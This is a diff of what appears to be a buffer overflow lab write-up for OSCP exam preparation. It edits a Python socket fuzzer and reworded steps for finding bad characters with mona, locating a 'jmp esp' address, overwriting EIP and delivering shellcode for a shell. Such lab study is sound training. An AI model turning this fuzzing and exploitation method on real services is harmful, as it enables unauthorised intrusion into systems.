@@ -101,17 +101,17 @@ def fuzzer(host, port):
 
         while True:
                 try:
-					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-					s.connect((host, port))
-					s.send(function + payload)
-					sleep(.25)
-					payload += b'A' * 100
-					print("fuzzing at %s bytes.." % str(len(payload)))
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.connect((host, port))
+				s.send(function + payload)
+				sleep(.25)
+				payload += b'A' * 100
+				print("fuzzing at %s bytes.." % str(len(payload)))
 
                 except Exception as err:
-					print(err)
-					print("fuzzer crashed. -> %s bytes.." % str(len(payload)))
-					sys.exit()
+				print(err)
+				print("fuzzer crashed. -> %s bytes.." % str(len(payload)))
+				sys.exit()
 
 
 if __name__ == '__main__':
@@ -310,7 +310,7 @@ Execute the script. After executing, follow the hexdump of stack pointer (ESP).
 
 ![follow_hexdump.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/follow_hexdump.png)
 
-There a couple of badcharacters.. a string terminator. If our exploit code falls off on badchars like this, it will be terminated. Goal is to remove the badcharacters. We can easly spot them using mona.
+If our exploit falls off on badchars like this, it will break our shellcode thus will be terminated. Goal is to remove the badcharacters. We can easly spot them using mona.
 
 ```
 !mona compare -f c:\users\admin\desktop\oscp\bytearray.bin -a 0198FA30
@@ -360,7 +360,7 @@ if __name__ == '__main__':
         exploit()
 ```
 
-Before executing the script, prepare a bytearray on mona with the badchars. Compare it again. Once the badchars are removed, its time for exploitation.
+Before executing the script, prepare a bytearray on mona with the badchars. Compare it again. Once the badchars are removed, its time to generate our exploit code.
 
 ```
 !mona bytearray -b "\x00\x16\x2f\xf4\xfd"
@@ -373,14 +373,14 @@ Before executing the script, prepare a bytearray on mona with the badchars. Comp
 
 # Jump to a shell code
 
-We can jump to a shellcode in a reliable way instead on directly to the EIP. If it contains a nullbyte or badchars, it will just terminate our shellcode. Lets find a return address, to jump on our shellcode.
+If it contains a nullbyte or badchars, the shellcode will break. A reliable way is to find an jmp esp directly to EIP.
 
 Mona (while on crashed state)
 ```
 mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"
 ```
 
-Click the View -> Log, if it doesnt show. We can see the ESP return addresses. We can use it to leverage and jump to our shellcode. Take note of the memory addresses available.
+Click the View -> Log, if it doesnt show. We can see the ESP return addresses and it can be leveraged and move to our exploit. Take note of the memory addresses available.
 
 ![jmp_esp.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/jmp_esp.png)
 
@@ -523,11 +523,11 @@ if __name__ == '__main__':
         exploit()
 ```
 
-# Summary
+# Conclusion
 
 Sending the exploit shellcode to the program to parse, note that we get the exact offset of the program send a bunch of AAAA's and overwrite the EIP with the ESP address, to jump into our shellcode.
 
-We can use to fill nop sleds to slide down to our shellcode and avoid null terminators, in case our exploit will not work. starting from 8 bytes. multiple of 8.
+We can use to fill nop sleds to slide down to our shellcode and avoid badchars and terminators, in case our exploit will not work.
 
 After executing the script.. we should get a shell.
 
